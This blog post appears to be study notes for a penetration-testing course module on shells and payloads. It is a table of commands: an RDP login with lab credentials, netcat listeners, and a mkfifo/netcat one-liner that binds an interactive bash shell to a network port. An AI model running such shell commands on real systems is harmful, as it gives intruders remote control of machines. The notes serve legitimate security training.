---
layout:     post
title:      "Shells & Payloads"
subtitle:   "Shells & Payloads"
date:       2024-03-01
author:     "k1r4"
header-img: "img/footprinting.webp"
catalog:    true
tags:
    - shells
    - payloads
---

## Shells & Payloads


|**Command**|**Description**|
|-|-|
| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol. |
| `env` | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use. |
| `sudo nc -lvnp <port #>` | Starts a netcat listener on a specified port. |
| `nc -nv <ip address of computer with listener started><port being listened on>` | Connects to a netcat listener at the specified IP address and port. |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f` | Uses netcat to bind a shell `(/bin/bash)` the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on. |











----

